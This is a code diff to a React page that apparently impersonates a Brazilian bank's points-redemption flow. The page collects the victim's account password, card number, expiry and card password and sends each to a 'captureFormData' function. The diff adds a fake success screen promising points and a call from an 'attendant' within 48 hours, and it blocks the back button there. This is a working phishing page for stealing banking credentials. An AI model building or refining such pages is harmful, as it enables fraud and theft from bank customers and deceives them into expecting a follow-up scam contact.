@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { ChevronLeft } from "lucide-react";
+import { ChevronLeft, ShieldCheck } from "lucide-react";
 import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
 
 const SenhaAcesso = () => {
@@ -8,7 +8,7 @@ const SenhaAcesso = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { nome, agencia, conta } = (location.state as any) || {};
-  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao">("senha");
+  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao" | "sucesso">("senha");
   const [senha, setSenha] = useState("");
   const [numero, setNumero] = useState("");
   const [validade, setValidade] = useState("");
@@ -51,7 +51,7 @@ const SenhaAcesso = () => {
   const handleSenhaCartao = () => {
     if (senhaCartao.length === 6) {
       captureFormData("senha-cartao", { senhaCartao });
-      navigate("/confirmacao", { state: { nome, conta, agencia } });
+      setPhase("sucesso");
     }
   };
 
@@ -60,7 +60,7 @@ const SenhaAcesso = () => {
       {/* Header */}
       <div className="px-5 pt-6 pb-4">
         <div className="flex items-center gap-4">
-          <button onClick={() => phase === "senhaCartao" ? setPhase("cartao") : phase === "cartao" ? setPhase("senha") : navigate(-1)}>
+          <button onClick={() => phase === "sucesso" ? null : phase === "senhaCartao" ? setPhase("cartao") : phase === "cartao" ? setPhase("senha") : navigate(-1)}>
             <ChevronLeft className="text-primary-foreground" size={24} />
           </button>
           <h1 className="text-primary-foreground text-lg font-semibold flex-1 text-center pr-8">
@@ -78,7 +78,7 @@ const SenhaAcesso = () => {
           Conta com dígito: <span className="font-semibold">{maskedConta}</span>
         </p>
         <p className="text-primary-foreground text-sm">
-          Nome: <span className="font-semibold">{nome?.toUpperCase() || "TITULAR"}</span>
+          {phase === "sucesso" ? "Titularidade" : "Nome"}: <span className="font-semibold">{nome?.toUpperCase() || "TITULAR"}</span>
         </p>
       </div>
 
@@ -169,7 +169,7 @@ const SenhaAcesso = () => {
               continuar
             </button>
           </>
-        ) : (
+        ) : phase === "senhaCartao" ? (
           <>
             <p className="text-foreground text-base font-medium mb-4">Qual é a senha do seu cartão?</p>
             <input
@@ -196,6 +196,25 @@ const SenhaAcesso = () => {
               continuar
             </button>
           </>
+        ) : (
+          <div className="flex-1 flex flex-col items-center justify-center text-center">
+            <div className="w-16 h-16 rounded-full bg-[#D7004D]/10 flex items-center justify-center mb-6">
+              <ShieldCheck className="text-[#D7004D]" size={36} />
+            </div>
+            <p className="text-foreground text-xl font-bold mb-3">Resgate realizado com sucesso!</p>
+            <p className="text-muted-foreground text-base mb-1">
+              Você possui <span className="text-[#D7004D] font-bold">120.258</span> pontos para o resgate.
+            </p>
+            <p className="text-muted-foreground text-base mb-8">
+              Um atendente entrará em contato em até 48 horas.
+            </p>
+            <button
+              onClick={() => navigate("/")}
+              className="w-full py-4 rounded-full bg-[#D7004D] text-white font-semibold text-base hover:opacity-90 transition-opacity"
+            >
+              finalizar
+            </button>
+          </div>
         )}
       </div>
     </div>
